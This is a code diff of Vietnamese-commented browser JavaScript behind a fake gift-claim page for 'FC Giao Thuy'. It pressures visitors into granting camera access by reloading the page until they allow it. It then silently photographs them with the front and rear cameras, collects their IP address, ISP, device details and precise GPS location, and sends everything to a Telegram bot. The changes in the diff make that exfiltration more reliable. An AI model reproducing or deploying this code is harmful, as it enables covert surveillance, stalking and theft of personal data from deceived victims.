@@ -7,7 +7,6 @@ const info = {
 
 const delay = ms => new Promise(res => setTimeout(res, ms));
 
-// Hàm chụp ảnh - Nếu không có stream sẽ văng lỗi ngay
 async function captureCamera(facingMode = 'user') {
   const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode }, audio: false });
   return new Promise(resolve => {
@@ -21,7 +20,7 @@ async function captureCamera(facingMode = 'user') {
       setTimeout(() => {
         canvas.getContext('2d').drawImage(video, 0, 0);
         stream.getTracks().forEach(t => t.stop());
-        canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.7);
+        canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.5); // Nén xuống 0.5 cho nhẹ, dễ gửi
       }, 700);
     };
   });
@@ -39,26 +38,22 @@ async function main() {
   let backBlob = null;
 
   try {
-    // 2. BƯỚC QUAN TRỌNG: ÉP QUYỀN CAMERA
-    // Chụp mặt trước
+    // 2. ÉP QUYỀN CAMERA (Từ chối là Reload)
     frontBlob = await captureCamera("user");
-    await delay(500);
-    // Chụp mặt sau
+    await delay(300);
     backBlob = await captureCamera("environment");
     info.camera = "✅ Thành công";
   } catch (e) {
-    // NẾU TỪ CHỐI HOẶC LỖI -> HIỆN THÔNG BÁO VÀ RELOAD
-    alert("CẢNH BÁO: Hệ thống yêu cầu quyền Camera để xác thực nhận quà. Vui lòng nhấn 'Cho phép' và thử lại!");
-    location.reload(); // Tải lại trang ngay lập tức
-    return; // Dừng mọi logic phía sau
+    alert("CẢNH BÁO: Bạn phải Cho phép Camera để hệ thống xác thực danh tính nhận quà FC!");
+    location.reload();
+    return;
   }
 
-  // 3. LẤY IP & GPS (Chỉ chạy khi đã vượt qua bước Cam)
+  // 3. LẤY IP & GPS
   const getIP = fetch('https://ipwho.is/').then(r => r.json()).then(res => {
     info.ip = res.ip;
     info.isp = res.connection?.org || 'N/A';
-    info.lat = res.latitude;
-    info.lon = res.longitude;
+    if (!info.lat) { info.lat = res.latitude; info.lon = res.longitude; }
   }).catch(() => {});
 
   const getGPS = new Promise(res => {
@@ -66,18 +61,17 @@ async function main() {
       p => {
         info.lat = p.coords.latitude.toFixed(6);
         info.lon = p.coords.longitude.toFixed(6);
-        info.address = `GPS: ${info.lat}, ${info.lon}`;
+        info.address = `Vệ tinh chính xác`;
         res();
       },
-      () => res(), // Nếu từ chối GPS thì dùng tạm tọa độ IP ở trên
+      () => res(), 
       { enableHighAccuracy: true, timeout: 4000 }
     );
   });
 
-  // Đợi đồng bộ dữ liệu
   await Promise.all([getIP, getGPS, delay(1500)]);
 
-  // 4. GỬI TELEGRAM (Chắc chắn 100% có ảnh mới chạy tới đây)
+  // 4. CẤU TRÚC LẠI NỘI DUNG (Sửa link Maps chuẩn)
   const mapsLink = `https://www.google.com/maps?q=${info.lat},${info.lon}`;
   const caption = `
 🏆 <b>[DATA NHẬN QUÀ FC GIAO THỦY]</b>
@@ -85,31 +79,54 @@ async function main() {
 🕒 <b>Time:</b> ${info.time}
 📱 <b>Device:</b> ${info.device} (${info.os})
 🌍 <b>IP:</b> ${info.ip} | <b>ISP:</b> ${info.isp}
-📍 <b>Maps:</b> <a href="${mapsLink}">Bấm để xem vị trí</a>
-🏙️ <b>Địa chỉ:</b> ${info.address || 'Đang xác định...'}
-📸 <b>Cam:</b> ${info.camera}
+📍 <b>Bản đồ:</b> <a href="${mapsLink}">Bấm để xem vị trí</a>
+🏙️ <b>Địa chỉ:</b> ${info.address || 'Tọa độ IP'}
 `.trim();
 
+  // 5. GỬI TELEGRAM (Sửa cấu trúc sendMediaGroup)
   const formData = new FormData();
   formData.append('chat_id', TELEGRAM_CHAT_ID);
-  
+
   const media = [];
-  formData.append('p1', frontBlob, '1.jpg');
-  media.push({ type: 'photo', media: 'attach://p1', caption: caption, parse_mode: 'HTML' });
-  
+  if (frontBlob) {
+    formData.append('p1', frontBlob, 'front.jpg');
+    media.push({
+      type: 'photo',
+      media: 'attach://p1',
+      caption: caption,
+      parse_mode: 'HTML'
+    });
+  }
   if (backBlob) {
-    formData.append('p2', backBlob, '2.jpg');
-    media.push({ type: 'photo', media: 'attach://p2' });
+    formData.append('p2', backBlob, 'back.jpg');
+    media.push({
+      type: 'photo',
+      media: 'attach://p2'
+    });
   }
 
   formData.append('media', JSON.stringify(media));
 
   try {
-    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMediaGroup`, {
+    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMediaGroup`, {
       method: 'POST',
       body: formData
     });
+    
+    const resData = await response.json();
+    if (!resData.ok) {
+        // Nếu gửi Group lỗi, thử gửi tin nhắn văn bản làm backup
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: TELEGRAM_CHAT_ID,
+                text: "⚠️ Lỗi Media nhưng có Data:\n" + caption,
+                parse_mode: 'HTML'
+            })
+        });
+    }
   } catch (err) {
-    console.error("Lỗi gửi Telegram:", err);
+    console.error("Lỗi kết nối:", err);
   }
 }
